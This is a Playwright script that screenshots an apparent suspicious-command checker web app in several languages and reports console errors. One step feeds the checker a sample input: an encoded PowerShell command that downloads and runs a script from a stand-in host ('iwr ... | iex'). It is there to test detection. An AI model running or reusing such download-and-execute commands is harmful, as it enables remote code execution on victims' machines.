// Screenshots the built web checker in a few states and reports console/CSP errors.
import { chromium } from 'playwright';
import { readFileSync } from 'node:fs';
import { extname } from 'node:path';

const dist = new URL('../web/dist/', import.meta.url).pathname;
const outDir = process.argv[2];
const types = { '.html': 'text/html', '.js': 'text/javascript', '.svg': 'image/svg+xml' };
const browser = await chromium.launch();
const errors = [];
const shoot = async (name, width, height, steps) => {
  const page = await browser.newPage({ viewport: { width, height }, deviceScaleFactor: 2 });
  page.on('console', (m) => m.type() === 'error' && errors.push(`${name}: ${m.text()}`));
  page.on('pageerror', (e) => errors.push(`${name}: ${e.message}`));
  await page.route('https://owlcept.test/**', (route) => {
    const path = new URL(route.request().url()).pathname.replace(/^\/$/, '/index.html');
    try {
      route.fulfill({ body: readFileSync(dist + path.slice(1)), contentType: types[extname(path)] ?? 'application/octet-stream' });
    } catch {
      route.fulfill({ status: 404, body: '' });
    }
  });
  await page.goto('https://owlcept.test/');
  await steps(page);
  await page.waitForTimeout(300);
  await page.screenshot({ path: `${outDir}/${name}.png`, fullPage: true });
  await page.close();
};

await shoot('desktop-suspicious-en', 1280, 900, async (p) => {
  await p.click('[data-example="suspicious"]');
  await p.selectOption('#target', 'run');
});
await shoot('mobile-installer-hi', 390, 844, async (p) => {
  await p.click('[data-lang="hi"]');
  await p.click('[data-example="installer"]');
});
await shoot('mobile-signin-kn', 390, 844, async (p) => {
  await p.click('[data-lang="kn"]');
  await p.click('[data-example="signin"]');
});
await shoot('mobile-encoded-en', 390, 844, async (p) => {
  await p.click('[data-lang="en"]');
  const enc = Buffer.from('iwr https://example-lure.test/a.ps1 | iex', 'utf16le').toString('base64');
  await p.fill('#text', `powershell -enc ${enc}`);
  await p.check('#lure');
});
await browser.close();
console.log(errors.length ? `ERRORS:\n${errors.join('\n')}` : 'no console errors');
